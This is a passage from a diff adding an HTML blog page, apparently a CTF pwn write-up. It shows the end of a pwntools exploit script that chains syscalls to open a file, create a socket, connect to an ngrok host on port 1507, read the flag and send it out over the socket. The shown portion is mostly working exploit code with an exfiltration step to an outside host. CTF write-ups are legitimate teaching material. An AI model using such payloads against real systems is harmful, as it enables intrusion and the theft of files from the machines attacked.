+    payload <span style="color:#f92672">+=</span> syscall(<span style="color:#ae81ff">5</span>, elf<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">0x10</span>), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
+
+    <span style="color:#75715e"># open socket</span>
+    sock_arg  <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">2</span>)
+    sock_arg <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">1</span>)
+    sock_arg <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> write_str(elf<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">0x20</span>), sock_arg)
+    <span style="color:#75715e"># socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)</span>
+    payload <span style="color:#f92672">+=</span> syscall(<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">1</span>, elf<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">0x20</span>))
+
+    <span style="color:#75715e"># connect</span>
+    IPHEX <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x030ed4ad</span> <span style="color:#75715e"># 0.tcp.ngrok.io</span>
+    connect_struct  <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x0b290002</span>) <span style="color:#75715e"># port: 1507, domain: AF_INET</span>
+    connect_struct <span style="color:#f92672">+=</span> p32(IPHEX)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+    payload <span style="color:#f92672">+=</span> write_str(elf<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">0x30</span>), connect_struct)
+
+    connect_arg  <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">1</span>) <span style="color:#75715e"># sockfd</span>
+    connect_arg <span style="color:#f92672">+=</span> p32(elf<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">0x30</span>)) <span style="color:#75715e"># connect_struct</span>
+    connect_arg <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x10</span>) <span style="color:#75715e"># connect_struct size</span>
+    payload <span style="color:#f92672">+=</span> write_str(elf<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">0x100</span>), connect_arg)
+    <span style="color:#75715e"># connect(sockfd, (struct sockaddr *) &amp;connect_struct, 0x10)</span>
+    payload <span style="color:#f92672">+=</span> syscall(<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">3</span>, elf<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">0x100</span>))
+
+    <span style="color:#75715e"># read flag</span>
+    payload <span style="color:#f92672">+=</span> syscall(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>, elf<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">0x200</span>), <span style="color:#ae81ff">0x100</span>)
+
+    <span style="color:#75715e"># write to sockfd</span>
+    payload <span style="color:#f92672">+=</span> syscall(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, elf<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">0x200</span>), <span style="color:#ae81ff">0x100</span>)
+
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)</code></pre></div>
+
+		
+	</div>
+
+	<div class="pagination">
+		<a href="/posts/hacktoday-2019-quals-pwn/" class="left arrow">&#8592;</a>
+
+		<a href="#" class="top">Top</a>
+	</div>
+</main>
+
+
+        		<footer>
+			<span>
+			&copy; <time datetime="2019-08-27 23:00:33.900781946 &#43;0700 WIB m=&#43;0.081306247">2019</time> . Made with <a href='https://gohugo.io'>Hugo</a> using the <a href='https://github.com/EmielH/tale-hugo/'>Tale</a> theme.
+			</span>
+		</footer>
+
+    </body>
+</html>
